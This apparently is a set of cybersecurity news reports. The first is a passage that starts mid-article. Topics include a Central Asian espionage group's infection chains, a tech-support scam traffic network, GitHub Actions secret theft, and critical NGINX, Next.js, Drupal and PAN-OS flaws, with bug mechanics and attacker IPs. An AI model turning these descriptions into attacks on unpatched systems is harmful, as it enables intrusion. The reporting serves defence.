It's assessed to be a Kazakhstan-nexus threat actor active since at least 2020, sharing overlaps with other clusters codenamed YoroTrooper (aka Comrade Saiga, ShadowSilk, and SturgeonPhisher), ShadowSilk, Cavalry Werewolf, and Tomiris. It's suspected that both UAT-6275 and YoroTrooper are part of the same broader activity cluster, although no direct indicator or toolset overlap has been observed between the two. Earlier this year, VMRay disclosed that a threat cluster it tracks as Hydra Saiga compromised at least 34 organizations across 8 countries since December 2024, with reconnaissance efforts extending to over 200 additional targets across the world. It's worth noting that both Comrade Saiga and Hydra Saiga refer to the same threat actor. The "hydra" prefix in the tracking alias is a reference to the adversary's heavy focus on breaching infrastructure linked specifically to water resources in Central Asia using a mix of custom implants written in Rust, Go, and Python and Living-off-the-Land techniques. Attack chains mounted by the threat actor involve the use of spear-phishing emails containing diplomatic relations, international trade, energy, and aviation-themed decoy documents. No less than eight campaigns have been identified across the region between January 2025 and May 2026. The phishing emails are sent from compromised government accounts and make use of official-looking documents to lend the social engineering attack a veneer of credibility. "Identified lures included a diplomatic letter addressed to Armenia’s Ministry of Foreign Affairs, a Turkmenistan airspace application form, and a business proposal concerning Russia’s Orsk Oil Refinery," Recorded Future said. What's more, three publicly accessible staging directories linked to the threat actor have been found to host Linux-compatible tooling and a publicly available proof-of-concept exploit for CVE-2025-25257, an SQL injection flaw in Fortinet FortiWeb, suggesting a possible expansion of the threat actor's operational capabilities. Infection sequences have been found to employ four different pathways - June 2025 - Using macro-enabled Word documents to download and run a second-stage binary. July 2025 - Using downloaders built with PS2EXE, a tool that packages PowerShell scripts as Windows executables, to fetch reverse-shell payloads and create scheduled tasks for persistence. October 2025 - Using a malicious shortcut (LNK) within a RAR archive to launch PowerShell responsible for retrieving and executing a GitHub-hosted script that provides remote shell access. Subsequent iterations also download PickleShell and stage it in the Windows Startup folder so that it's automatically launched every time a user logs in to the system. April 2026 - Using a RAR archive that exploits a WinRAR flaw (CVE-2025-8088) to drop PickleShell in the Windows Startup folder. The April 2026 infection chain marks the first time UAT-6275 has weaponized a security flaw as part of its malware delivery methods. "UAT-6275's sustained activity and adoption of new delivery techniques suggest the group will continue pursuing access to government organizations across Central Asia and the CIS," Talos said. "Its interest in environmental agencies, economic ministries, and energy infrastructure reflects the intelligence value of regional diplomacy and resource management."

yrpqjw.text: A long-running Traffic Distribution System (TDS) known as Help TDS to a Russian-language affiliate program called Hotejka, which appears to be a rebrand of a traffic monetization operation dubbed ROI777. Help TDS is assessed to be active since at least 2017, offering PHP code templates to partners and affiliates that are installed into compromised websites with an aim to direct unsuspecting users to tech support scams. These scams make use of full-screen browser manipulation and exit prevention techniques to serve bogus Microsoft Windows security alert screens instructing victims to contact a Windows Support number to address the problem. "Help TDS delivers tech support scams (TSSs) that direct users to call centers, where social engineering is used to convince them to install remote desktop tools," Infoblox said in a report shared with The Hacker News. "It's not simple credit card fraud: it's remote access, living-off-the-land malware operations. Once in, the threat actor can exploit the victim time and again." Help TDS's evolution was documented by GoDaddy in August 2025, highlighting the threat actor's use of a malicious WordPress plugin named "woocommerce_inputs" on thousands of websites to steal WordPress user credentials and facilitate the malicious redirections by fetching the URLs from its command-and-control (C2) servers. The plugin, or alternatively a custom HTML block, is injected into the sites by Hotejka's affiliates. Historical tracking of malicious redirect chains has also uncovered that Help TDS has routinely handed off traffic directly to VexTrio Viper, a cybercrime operator that runs an affiliate program to enable scams, riskware, spyware, adware, and pornographic content. The latest findings connect the TDS to Hotejka, which, in turn, is suspected to be a successor to ROI777, an entity that was exposed by Guardicore Labs (now part of Akamai) in June 2018 in connection with a traffic manipulation and cryptocurrency mining campaign codenamed Operation Prowli. The activity involved the compromise of vulnerable servers to deploy a malware named r2r2 and then leverage them to mine cryptocurrency. In tandem, WordPress sites and servers running other content management systems (CMS) were exploited for traffic monetization fraud. "Traffic monetizers, such as ROI777, buy traffic from 'website operators' such as the Prowli attackers and redirect it to domains on demand," Guardicore Labs noted at the time. "Website 'operators' earn money per traffic sent through roi777. The destination domains frequently host different scams, such as fake services, malicious browser extensions and more." The rebrand is believed to be driven by the leak of data obtained from ROI777's servers in March 2018, around when it was operating Disposable TDS, a precursor to Help TDS. The published details included Telegram identities of its users and details of multiple campaigns. The connection between Hotejka and ROI77 doesn't end there, for GoDaddy also found that "roi777[.]com" was one of the historical C2 domains used between 2018 and 2020 to fetch the redirect domains. "[Hotejka's] affiliates range from spam operators to website compromisers," Infoblox said. "Potential victims are redirected into the TDS from these affiliates via special URLs provided by Hotejka. The TDS then evaluates the user via browser fingerprinting and location to determine the course of action." A TDS functions akin to a relay, intercepting internet traffic from compromised websites, malicious ads, social media posts, or SEO spam, analyzing the visitor, filter traffic based on predefined criteria (e.g., geographic location, device metadata, IP reputation, and headless browsers), and dynamically route them to scams, browser lockers, or malware drops. "Help TDS and its precursors are the routing decision infrastructure for a small affiliate program," Infoblox explained. "Other threat actors, for example ones who have compromised websites, send potential victim traffic to the TDS through specially crafted URLs." The TDS is believed to be implemented on Keitaro, an advertising performance tracking platform that's known to be abused by various threat actors. Some of the initial Help TDS lures prompt users of an impending Windows update, followed by a warning that the machine has been disabled by Microsoft, tells them not to restart the computer, and that a "computer lock" has been put in place to block illegal activity. The scareware prompt is designed to persuade the victim to contact the Microsoft Technical Support team. Should the victim make the phone call, the threat actor on the other end instructs them to download and install a free remote desktop tool like Ultraviewer to gain complete control of the infected machine. The fingerprinting step determines whether to route the user to either the tech support scam or to another affiliate marketing platform, which then evaluates the device again and resells the traffic. These pathways lead to scam landing pages with fake CAPTCHA checks to enroll the victim's browser to push-notification spam. "Historical DNS records, loyal use of other affiliate advertising platforms over the years, and consistent command-and-control (C2) mechanisms give us a high degree of confidence that ROI777 and Hotejka are one and the same," Infoblox said. Messages posted by Hotejka on their Telegram channel (@hotejka_hot) demonstrate their criminal intent by advertising forced browser extension installations and tech support landing pages that are "very difficult to exit." In one post dated July 17, 2026, the operator claimed a "small call center in Germany will handle 50-100 calls per day." Since April 2026, the scams are run on free Cloudflare Pages sites (*.pages[.]dev), with the threat actor creating roughly 300 disposable pages per day. Over 20,000 such domains have been detected since then. In recent years, Hotejka has also been observed using different aliases on forums like CrackingX, seeking traffic from email spam and access to WordPress admin panels for prices starting at $100. In all, about 20 different affiliates, including Balada Injector, Detour Dog, and DollyWay, send traffic to Help TDS. These operations are known to heavily target WordPress sites to redirect victims to scams and malware. "Hotejka/ROI777 has been loyal to the two affiliate platforms since 2017, and we believe that loyalty has paid handsomely," Infoblox said. "Using DNS volumes observed over the past 8 years, our ability to use affiliate IDs to track traffic over time, and commonly cited payout figures for affiliate advertising in general, we suspect that the two European programs have paid them at least a few million dollars (USD)."

1khmvo8.text: NGINX released versions 1.30.6 and 1.31.7 on October 14 to fix five vulnerabilities, one of them present in every release since May 2005. There are three memory bugs that F5, the company behind NGINX, says could crash a worker process or possibly let an attacker run code, and each requires a specific configuration to exploit. A fourth lets an attacker forge a TLS session that could get past client-certificate checks, though F5 calls the forgery non-deterministic and beyond the attacker's control. The fifth lets an HTTP/3 client slip extra bytes into a request that NGINX passes on to a backend. None of the five was in CISA's Known Exploited Vulnerabilities catalog as of October 15, and neither NGINX nor F5 reports attacks. NGINX rates all five medium. F5 scores the three memory bugs 9.2, Critical, on CVSS v4.0, the TLS flaw 8.3, and the HTTP/3 flaw 6.9. Which Configurations Are Exposed Every one of the five needs a directive you added: an alias with a rewrite, a regex map, AIO with SSI, a shared TLS session cache, or HTTP/3. NGINX's own documentation recommends the shared session cache and request buffering; the other condition for the HTTP/3 flaw is on by default. The TLS flaw sits in the automatic rotation of session ticket keys. Session tickets let a client resume a TLS session without a full handshake, and since version 1.23.2, from October 2022, a shared session cache makes NGINX generate and rotate the ticket keys itself unless you load keys from a file. Each worker process keeps a copy of three key slots. Rotation copied only two, so the third slot held whatever was in memory before, and a ticket naming that slot could be verified and decrypted with that uninitialized key material, "allowing a forged session," the fix commit says. F5 says the forgery works "in a non-deterministic manner that is beyond the attacker's control," and that an attacker could use it to bypass verification of client certificates. The exposed setting, ssl_session_cache shared:SSL:10m, is the one NGINX's documentation uses in its example configuration. NGINX fixed a session-reuse flaw with the same consequence, CVE-2025-23419, in February 2025. The conditions and workarounds below are NGINX's and F5's. The version ranges are from NGINX's advisories page. Flaw What it allows Configuration that exposes you Affected versions If you cannot upgrade (F5) CVE-2026-15176 Heap overflow in a worker process: crash, possibly code execution A location with alias, a rewrite that changes the URI, and anything that reads $request_filename (return, set, if, add_header or the access-log format) 0.1.29 to 1.31.6 Do not use alias in that location. Do not use $request_filename. CVE-2026-93479 Heap overflow in a worker process: crash, possibly code execution A regex map whose captures are referenced by root or log_format before the map's output variable 1.30.0 to 1.30.5 and 1.31.2 to 1.31.6 Use named captures, and use them only inside the block with the regex match. CVE-2026-97205 Use-after-free in a worker process: crash, memory corruption, possibly code execution aio enabled and an SSI page with include virtual commands, in some configurations 0.8.11 to 1.31.6 Turn aio off, or do not serve SSI pages. CVE-2026-95101 Extra bytes injected into a proxied request, or a body past client_max_body_size HTTP/3 with proxy_request_buffering on , the default 1.25.0 to 1.31.6 Set proxy_request_buffering off. CVE-2026-97629 A forged TLS session that could bypass client-certificate verification (non-deterministic and beyond the attacker's control, F5 says) ssl_session_cache shared:... without ssl_session_ticket_key , which turns on automatic key rotation 1.23.2 to 1.31.6 Remove the shared cache directive, or load keys from a file with ssl_session_ticket_key. Servers with ssl_session_tickets off are not affected. One Flaw Traces to July's Fix The map flaw, CVE-2026-93479, is in the string-handling code that NGINX patched on July 15 for CVE-2026-42533, a heap overflow F5 scored 9.2 that is reached through a regex map's captures. The new overflow became possible after a change in that July release, according to the fix commit. A July patch added protection against overrunning a buffer, but data could still spill into a reserved area, and a second July patch then sized the final string from that spilled length, so the string could outgrow its buffer. The commit puts limits on it. The overflow is at most the size of the reserved area on the document-root path, and a single null byte on the access-log path. F5's advisory and NGINX's advisories page list 1.30.0 and 1.31.2 as the earliest affected versions, which come before the July change. A server patched in July is inside the affected range either way. F5's July workaround had already been questioned. Researcher Stan Shaw told The Hacker News in July that switching to named captures left a narrower path open, and that upgrading was "the only complete fix." The fix commits for the alias, AIO and HTTP/3 flaws describe the other three bugs. The alias flaw opens in the moment after a rewrite changes a request's URI and before NGINX picks the next location. If anything reads $request_filename in that window, and the location's prefix is longer than the rewritten URI, mapping the URI to a file path overflows a buffer. The AIO flaw is a counter. Each pending asynchronous operation on a request adds one to an 8-bit field with no check, so 256 pending operations wrap it to zero and the request can be freed while those operations still point at its memory. NGINX names SSI pages with include virtual commands, which can run their included requests in parallel, as the trigger. The HTTP/3 flaw came from one parser field doing two jobs: holding the remaining length of an unknown frame being skipped, and the number of DATA bytes to pass on as request body. When an unknown frame was split across two reads, the leftover count was treated as body and sent to the backend, outside the client_max_body_size check. What to Do Upgrade to 1.30.6 on the stable branch or 1.31.7 on mainline. The stable release contains only fixes. NGINX publishes fixes for those two branches only, so older branches such as 1.28 stay inside the affected ranges, and a distribution package is fixed only if your distribution has backported the patches. NGINX Plus customers, and users of F5's Ingress Controller, Gateway Fabric, Instance Manager and WAF products, should check F5's advisories, which list affected builds and, for several products, no fixed build as of October 15. If you cannot upgrade yet, the table above has F5's workaround for each flaw. To see which paths your server has enabled, print the running configuration with nginx -T and search it for alias beside a rewrite, a regex map used by root or log_format, aio together with ssi, listen lines with quic, and ssl_session_cache shared without ssl_session_ticket_key. The rewrite-module overflow NGINX patched in May, CVE-2026-42945, was being exploited within days of disclosure, VulnCheck found. This is NGINX's eighth security release of 2026. F5 credits Matt Suiche of Tolmo and Mateusz Gierblinski with the map flaw, Hansol Lee of GOTROOT with the HTTP/3 flaw, PhiNode Labs with the TLS flaw, and a researcher it names as Cyberlanc3r with the AIO flaw. F5 found the alias flaw itself. NGINX also released njs 1.0.2 the same day, fixing two medium-severity XML-handling flaws in its JavaScript module, CVE-2026-101025 and CVE-2026-101019.

1n8mf91.text: Next.js released an out-of-band security update on October 14 that fixes two critical flaws allowing unauthenticated remote code execution, along with a high-severity denial-of-service flaw. One code-execution flaw is in React Server Components, and the other in librsvg, the open-source library Next.js uses through the sharp package to handle SVG images. The fixes are in Next.js 16.4.1 and 15.5.28, the current Active and Maintenance long-term support (LTS) releases. What Was Fixed The update covers three separate issues. Vercel, which develops Next.js, rated both code-execution flaws critical, each with a CVSS score of 9.5. The table lists the versions each issue affects and the version that fixes it. Issue Affected versions Fixed in Who is exposed Code execution through use cache ( GHSA-673q-mjm6-r5xr ) 16.0.0 through 16.4.0 16.4.1 App Router apps with Cache Components enabled, where a use cache function returns more than one typed array Code execution through SVG images (CVE-2026-96889, GHSA-2464-fhr4-w9xw ) 10.0.0 through 15.5.27, and 16.0.0 through 16.4.0 16.4.1, or 15.5.28 with sharp 0.35.5 or later Apps that pass attacker-supplied SVG files to sharp on glibc-based Linux Denial of service through Server Actions ( GHSA-p3m5-59mp-jv5r ) 13.0.0 through 15.5.27, and 16.0.0 through 16.4.0 15.5.28, 16.4.1 App Router apps with at least one Server Action Who Is Affected The first code-execution flaw is in React Server Components, the React feature that runs user-interface components on the server. React's advisory covers three packages, react-server-dom-webpack, react-server-dom-parcel, and react-server-dom-turbopack, in versions 19.0.0 through 19.3.0. It describes the flaw as affecting "extremely rare cases where responses transport multiple typed arrays and an attacker-controlled value." In a Next.js app, the trigger is a use cache function that returns more than one typed array, so only version 16 apps that enable Cache Components, the feature behind use cache, are exposed. Vercel says to upgrade even if your app has no such function. The second flaw is a memory bug in librsvg, the library that renders SVG images, which Next.js reaches through the bundled sharp package. Code execution is possible when Next.js runs on glibc-based Linux, according to the advisory. By default, Next.js does not optimize SVG files. Serving them through the image optimizer requires turning on a setting called dangerouslyAllowSVG. The same library also renders images for next/og, the feature that builds social-preview images, when that feature runs on the Node.js runtime. The third flaw is a denial-of-service issue. In App Router apps that define at least one Server Action, crafted requests can push one server process to full CPU use and stop it from handling other requests. Apps on the Pages Router, or with no Server Actions, are not affected. Exposure can differ by host. Netlify said its platform does not run the image-optimizer code path and that the flaws have limited impact on its setup, while still recommending the upgrade. What to Do Upgrade to Next.js 16.4.1 if you run version 16, or 15.5.28 if you run version 15, then rebuild and redeploy. Vercel's advisory says upgrading Next.js makes package managers supply the fixed sharp automatically. On version 16 that holds, because 16.4.1 requires sharp 0.35.5. On version 15 it may not. 15.5.28 still accepts the older, affected sharp 0.34.x, and upgrading over an existing install can leave that version in place. Check with npm ls sharp and update sharp to 0.35.5 or later if it is older. If you cannot upgrade Next.js right away, the image flaw has an interim option: make sure sharp is 0.35.5 or later, or block SVG rendering in sharp with sharp.block({ operation: ["VipsForeignLoadSvg"] }), as the sharp advisory describes. The use cache and Server Actions flaws have no workaround, and only the upgrade closes them. As of October 15, the use cache and Server Actions advisories had no CVE and did not appear in the npm advisory feed that npm audit uses, so dependency scanners may not warn you about them. The image flaw does surface, through sharp's own advisory. Why the Image Flaw Keeps Returning This is the third time since August that image processing in Next.js has produced a code-execution flaw. In August, a bug in libheif, reached through sharp, allowed code execution when the optimizer handled a crafted AVIF image. In September, a flaw in next/og let attacker-controlled text change the SVG it generated. Next.js did not change its own image code this time. 16.4.1 ships the same optimizer as 16.4.0 and fixes the image flaw by raising the bundled sharp to 0.35.5, which carries a patched librsvg (2.63.2). The librsvg bug, CVE-2026-96889, was made public on September 23 and fixed in sharp on September 27. Red Hat scored it 7.8 and said exploiting it needs user interaction, such as opening a malicious file. Vercel rated the Next.js exposure 9.5 and reachable over the network. The researcher who reported the librsvg bug, Rafael B. Dias, says it is the weakness behind September's next/og flaw. A working exploit for that earlier flaw, built for one specific server setup, has since been published. sharp's maintainer also warns that whether the flaw ends in code execution or only a crash can come down to the server's Node.js build, because the official Node.js binaries are not hardened against this kind of memory attack. Not the Same as React2Shell The React Server Components flaw sits in the same three packages as React2Shell, the maximum-severity flaw disclosed in December 2025 that attackers exploited at scale. This one is far narrower. React describes it as affecting "extremely rare cases where responses transport multiple typed arrays and an attacker-controlled value." As of October 15, there are no public reports that any of the three flaws fixed on October 14 has been used in attacks.

etcx2l.text: Swati KhandelwalOct 15, 2026Vulnerability / Web Security Drupal core has a critical flaw in its Field UI module that could let an attacker run code on the site's server, and fixes were shipped on October 14 in Drupal 11.4.10, 11.3.19, and 10.6.19. An attacker cannot reach the flaw through core alone, the Drupal Security Team said in its advisory. Several exploit paths exist through contributed modules, and at least one known path needs no login. Tracked as CVE-2026-108097, the flaw sits in Field UI, the core module behind the admin pages where site builders manage fields and how they display. Drupal rates it 19 out of 25 on its own risk scale, the level the project calls critical. The advisory does not name the contributed modules that open a path to the flaw, and custom code may also expose it. Drew Webber of the Security Team and Octavio Galland are credited with reporting it. What to Do Now The fixed release for each supported branch: Drupal 11.4.x: update to 11.4.10 Drupal 11.3.x: update to 11.3.19 Drupal 10.6.x: update to 10.6.19 Drupal 12.0.0 beta: 12.0.0-beta2, which is not for production use No fix: Drupal 11.2.x and below, 10.5.x and below, and Drupal 8 and 9, all of which are end-of-life Both 11.3.x and 10.6.x lose security coverage in December 2026. In the week starting October 4, 151,442 of the 531,499 sites that reported their Drupal core version to drupal.org (28.5%) were on a branch that the advisory lists as affected and that received no fix. A site that cannot update yet can uninstall the Field UI module, field_ui, which "will provide protection while sites are updated," the advisory says. The admin pages for managing fields and their display are unavailable while the module is uninstalled. Field UI is installed by Drupal's Standard install profile, so a site built from that profile has the module unless someone removed it. Drupal Steward, a web application firewall service with rules written by the Security Team, already blocks some known attack vectors for this flaw. Acquia, Pantheon, Ironstar, and Skpr run it for their customers. It does not cover every possible exploit, and those sites should still update, the advisory says. The advisory rated the flaw as having no publicly available exploit code at the time of publication. As of October 15, none had surfaced, and neither the advisory nor public reports described attacks using it. The Security Team had pre-announced the release on October 12 and told sites to reserve time for it "because exploits might be developed within hours or days." In May, Drupal reported exploit attempts within two days of its advisory for a core SQL injection flaw that affected only sites on PostgreSQL, and CISA added that flaw to its catalog of exploited vulnerabilities. What the Fix Changed Field UI builds its admin tables from render arrays, the PHP arrays Drupal turns into HTML. Before the fix, the table element's pre-render step ran whatever PHP callable each table row carried in its #region_callback property, through call_user_func_array, with no check on what that callable was. Drupal's renderer has refused to run untrusted render callbacks since version 8.8 in 2019, a restriction added after earlier advisories showed that the render system could too easily call arbitrary callbacks. The renderer trusts the table element's own methods, so it ran the pre-render step, and the check never reached the callable that step then executed. The 11.4.10 code no longer calls the callback. It reads each row's region from the row's own region value and uses the table's hidden region, or its first region, when that value is not a known region. The same call had been in the code since at least Drupal 8.9.0 in 2020. In core itself, the callback is set only by Field UI's own display forms. Custom code that set #region_callback on a field_ui_table row will find it no longer runs after the update. Pantheon tells sites to check such code and to test the manage fields and manage display pages after updating. Separately, the Entity List module received its own critical remote code execution advisory, CVE-2026-108099, with the same conditions, including a known path that needs no login. Its 3.0.10 release note says the fix mirrors the Field UI change, and updating core does not update the module. In the week starting October 4, 90 sites reported using it. The same core releases also fix two moderately critical cross-site scripting flaws, in the Link module (CVE-2026-108515) and the Navigation module (CVE-2026-108514), both of which need at least a logged-in user. Drupal 7 reached end of life on drupal.org in January 2025, but Pantheon says its Drupal 7 long-term support with Tag1 Consulting has shipped Drupal 7.107 with a backport of the fix.

1dguhyf.text: Ravie LakshmananOct 15, 2026Vulnerability / Network Security Palo Alto Networks on Wednesday issued security updates for a high-severity flaw in PAN-OS software that has come under active exploitation. The vulnerability, tracked as CVE-2026-0322 (CVSS score: 8.6), is a case of remote code execution in the management interface. "A remote code execution (RCE) vulnerability in the management interface of Palo Alto Networks PAN-OS software enables an authenticated attacker with network access to execute arbitrary code with root privileges on the firewall," Palo Alto Networks said. The issue impacts PAN-OS software on PA-Series and VM-Series firewalls and on Panorama (virtual and M-Series). Cloud NGFW and Prisma Access are not affected by the vulnerability. Palo Alto Networks said that no special configuration is required to exploit the issue, but said the security risk can be minimized by restricting access to the management interface to only trusted internal IP addresses. "You can reduce the risk of exploitation by restricting access to a jump box that is the only system allowed to access the management interface," it said. Patches are available in the following versions - PAN-OS >= 12.2.4 PAN-OS >= 12.1.4-h12, >= 12.1.7-h8, >= 12.1.10-h2 PAN-OS >= 11.2.4-h22, >= 11.2.7-h21, >= 11.2.10-h15, >= 11.2.13-h3, >= 11.2.16 (ETA: October 15, 2026) PAN-OS >= 11.1.4-h37, >= 11.1.6-h39, >= 11.1.7-h11, >= 11.1.10-h35, >= 11.1.13-h15, >= 11.1.16-h3 PAN-OS >= 10.2.7-h38, >= 10.2.10-h41, >= 10.2.13-h26, >= 10.2.16-h11, >= 10.2.18-h12 The network security company also acknowledged it has seen "very limited exploitation" targeting the Palo Alto Networks management interface, but did not elaborate on the nature of the malicious activity involved, who is behind the effort, or when it began. The following IP addresses geolocated to the U.S. are assessed to be linked to the exploit attempts - 66.42.72[.]14 208.83.239[.]114 149.248.47[.]234 It credited Suraj Siddharudh, a senior principal product security researcher at Palo Alto Networks, with discovering and reporting the vulnerability. The disclosure comes as Cisco warned that threat actors are exploiting a critical flaw in Cisco Secure Email Gateway (CVE-2026-76519, CVSS score: 9.8) that could allow an unauthenticated, remote attacker to write arbitrary files on the underlying operating system. "This vulnerability is due to improper handling of email attachments when the file reputation service is enabled," it said. "An attacker could exploit this vulnerability by sending an email that contains a crafted attachment through an affected device. A successful exploit could allow the attacker to write arbitrary files and execute commands with root privileges on the underlying operating system." The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has since added both CVE-2026-0322 and CVE-2026-76519 to its Known Exploited Vulnerabilities (KEV) catalog, requiring Federal Civilian Executive Branch (FCEB) agencies to prioritize fixes by October 17, 2026.

1sltudp.text: AI is already part of digital forensics and incident response work, with or without a policy in place to govern it. The issue is that these tools are growing more confident in their own output faster than practitioners are developing reliable ways to verify it. Without governance models and validation standards in place, that gap compounds and rarely stays contained to a workstation: an unverified finding can end up in a forensic report, a deposition, or in court. At SANS, we created two new AI frameworks this year to help address this challenge: the Digital Forensics & AI Investigations Framework, which we mapped to the trusted standards established by the Scientific Working Group on Digital Evidence (SWGDE), and the Incident Response & AI Investigations Framework, which we mapped to the NIST Cybersecurity Framework 2.0. Both frameworks rest on the same principle: AI can accelerate investigative work, but the human examiner remains the final authority at every phase. Where Validation Cannot Be Delegated In digital forensics, validating an AI finding starts at the source file. A tool that doesn't show its reasoning has already produced an unreliable result, regardless of the confidence score attached to it. A tool that cites the specific file it parsed — for example, a claim that browser history came from Chrome's own database — gives an examiner somewhere to start. The claim is plausible at face value, but it still has to be confirmed independently before anyone treats it as fact. I think of a high-confidence AI output the way I'd think of a third grader insisting the homework is finished. Saying it's done isn't the same as it being done correctly, and no amount of confidence changes that. The only way to know is to verify it, the way a parent checks the homework instead of taking their child's word for it alone. The mistake I see often in the field is treating AI as a single source of truth. Practitioner forums are full of the same exchange: Someone scans a file, a detector reports it as AI-generated, and that becomes the finding. The claim has no named source and no reasoning behind it, and an examiner without foundational skills has no way to catch that. What the Record Has to Show Documenting what produced a finding matters as much as checking it. Plenty of examiners say they don't use AI, while machine learning has been running skin detection, facial similarity, and image categorization inside their forensic tools for years, generating the confidence scores they rely on. Naming the tool is sufficient when AI is built into a forensic product, since opposing experts can research the integration themselves. For a general-purpose model, the exact version needs to be on record. Version history matters more than practitioners expect because casework and AI capability move on different timelines. I worked a case where the tool that would have helped with the log files didn't exist at the time of collection. By the time I testified two years later, the technology had advanced well beyond what was available during the investigation, which is exactly the kind of gap opposing counsel can use against you without a clear record of what the technology could do at the time. One Policy Cannot Govern Both Disciplines Digital Forensics and Incident Response carry different risk tolerances, and a single AI policy written for one will fail the other. Incident response has more latitude by design, because responders aren't scrutinized on every single bit and byte, and the organization needs to know what happened quickly. AI genuinely helps there, in detection and in surfacing activity a human might not readily see. Forensic examiners operate under the opposite pressure, since every source file requires validation, which is why many expect AI to add work rather than remove it. Both instincts are correct for the job in front of them, which is why the two frameworks exist as separate documents instead of one shared policy. AI capability is moving faster than human oversight can keep up with. Offensively, AI is excelling; defensively, security teams remain more cautious and slow. Closing that gap during a live incident depends on how much an organization trusts its own tooling. If a team built and validated the AI making containment or triage recommendations, then a human in the loop, monitoring and intervening rather than approving every step, is workable. Requiring sign-off on every individual action during an active incident overwhelms an analyst quickly, exactly when speed matters most. The Real Variable Is the Practitioner Every phase of both frameworks returns to one constraint. AI should never take an action that can't be undone. Evidence collection illustrates why: An investigator gets one opportunity at a sound acquisition, and a flawed one forecloses analysis entirely, no matter how skilled the analyst who comes after. Hash verification can be automated safely. Deciding how to pull cloud data, approach a scene, or deploy tools to capture lateral movement across other systems cannot be, because none of those decisions can be walked back. Legal authority follows the same logic. AI flagging that a subject has a linked cloud account is useful; AI collecting that data on its own crosses a boundary an examiner cannot undo, and some forensic tools can cross it on their own if configured to. That's the real argument behind both frameworks' operational use cases and their course mappings by phase. Whether an investigation holds up depends on the practitioner running the AI. An examiner who understands the underlying discipline and uses AI on top of it becomes more valuable to their organization. An inexperienced person using AI is the landmine, and it's leadership's job to assess that risk honestly. Building a Defensible AI Practice in DFIR Frameworks like these are as dynamic as the technology they address, and they are only effective if practitioners have the most current information and the underlying skills to apply it, knowing where artifacts live before a tool tells you, understanding what a sound acquisition actually requires, and recognizing a wrong answer when a model produces one. SANS courses including FOR498: Digital Acquisition and Rapid Triage, FOR508: Advanced Incident Response, Threat Hunting, and Digital Forensics, and FOR608: Enterprise-Class Incident Response & Threat Hunting build that foundation across the phases both frameworks cover. Join us at SANS Cyber Defense Initiative 2026 in December to attend FOR508: Advanced Incident Response, Threat Hunting, and Digital Forensics in person, taught by Carlos Cajigas. Learn more about SANS’s DFIR training offerings here. Note: This article has been expertly written and contributed by Heather Barnhart, SANS VP of Curriculum.

mm9moc.text: Ravie LakshmananOct 15, 2026Telecom Security / Privacy The Indian government has directed telecom service providers (TSPs) in the country to mandatorily display callers' registered names along with their numbers for incoming calls starting November 1, 2026, in an effort to help people identify calls from unknown numbers and tackle spam or fraudulent calls. To that end, the Department of Telecommunications has issued a circular urging service providers to implement the Calling Name Presentation (CNAP) service. "At the time when a call is incoming, the calling name presentation service presents the calling name identity of the calling user on the user terminal of the called user," according to a circular issued by the Indian Ministry of Communications dated October 13, 2026. "Calling name identity is the name of the calling user as recorded in subscriber data record of the originating telecommunication service provider and such identity is included in the calling line identification of such user." The caller ID system is mainly targeted at wireless terrestrial networks established using 4G and higher generation technologies. The circular noted that a CNAP rollout for 2G and 3G networks, as well as public switched telephone networks (PSTNs), will be taken up separately after examination. Under the new guidelines, every time a user receives a call, the first field will display the caller's number, as is the existing practice. The second field will contain the name of the calling user in the following order of preference - If the number is already saved in the callee's contacts, the corresponding name is displayed. If the number is not saved, the calling name identity as stored in the telecom operator's subscriber database will be displayed for domestic calls. The label "International Call" will be presented for calls originating from outside India. To meet this requirement, every originating TSP is required to establish and maintain a database mapping subscribers' names to their numbers. The operator on the receiving end of the call will query this database to retrieve the calling name identity and present it to the user. Telecom operators are also expected to provide a Calling Line Identification Restriction (CLIR) facility, as part of which users can choose to hide their caller identity when making calls. Furthermore, the Ministry of Communications is urging TSPs to adopt a secure-by-design approach when implementing the system and ensure the security of communications by - Enforcing that the calling name identity is not retained upon completion of the incoming call Maintaining the quality of service in accordance with applicable laws Provisioning the necessary database, network, and connectivity infrastructure to support efficient processing of calling name identity queries Users with business connections or bulk connections can opt for a "preferred name" that replaces the calling name identity. The preferred name has to be one of the following - A trade mark registered in the name of the user as per the records of the Trade Marks Registry under the Controller General of Patents, Designs and Trade Marks, Department for Promotion of Industry and Internal Trade, Ministry of Commerce and Industry A trade name of the user as registered on the Goods and Services Tax portal "For new connections, the preferred name of the user shall be recorded in both the customer application form and subscriber data record and document(s) evidencing proof that the user is registered under such name shall be presented in original to the originating TSP and true copies thereof shall be attached to the customer application form by the originating TSP," according to the circular.

1f1bx50.text: Ravie LakshmananOct 15, 2026Supply Chain Attack / Cloud Security The credential-theft campaign known as GhostAction has ramped up, targeting more than 30,000 repositories across 3,000 users and organizations. The spike, according to GitGuardian, was observed on October 8 and 9, 2026. "This resulted from compromising the GitHub accounts of about 1,900 users. It attempted to extract 3,174 secrets from public repositories' CI," security researchers Gaetan Ferry and Guillaume Valadon said. GhostAction is the moniker for a supply chain attack campaign targeting developer infrastructure on GitHub. Originally discovered in September 2025, it involves threat actors compromising legitimate developer accounts to inject malicious GitHub Actions automation workflows into software repositories. Attackers have been found to gain write access to repositories using stolen Personal Access Tokens (PATs) or credentials harvested from infostealer logs and dumps. Using the hijacked maintainer account, they push a malicious workflow file disguised under deceptive names such as Security Audit ("security-audit.yml") or GitHub Actions Security ("github_actions_security.yml"). The end goal of the activity is the large-scale theft of continuous integration and continuous deployment (CI/CD) secrets, cloud credentials, package registry tokens (like npm, PyPI, and DockerHub), and artificial intelligence (AI) provider API keys. A new wave of GhostAction has been observed since August 31, 2026, with the malicious workflow pushed to hundreds of repositories. "This new wave seems more experimental and manual than previous ones, with the payload evolving over time," GitGuardian said. "Compared with the original GhostAction payload, the first version of this new payload added a git history secret-scanning feature." As previously outlined by Socket and StepSecurity, the history-scanning functionality features secret-detection regular expressions covering AWS key IDs, GitHub and GitLab tokens, AI-related secrets, and cloud API keys. A second version of the payload also captures about two lines of context around every AWS key ID hit so as to pair them with their matching secret access keys. A third and final variant of the payload includes support for retrieving the secret context during the git history scan. "This payload was deployed in multiple phases," GitGuardian said. "First to 160 previously observed victims, then, 20 minutes later, to 28,000 new repositories between October 8 and 9. New waves have been observed, using the same payload, on October 10 and 12. However, GitHub started preventing the malicious workflow from running starting October 9. Those two subsequent waves therefore could not extract any secrets." Interestingly, a subset of the victims from this new burst were previously compromised in the September 2025 and August 2026 waves, indicating the threat actors are banking on unrotated secrets to pull them off.

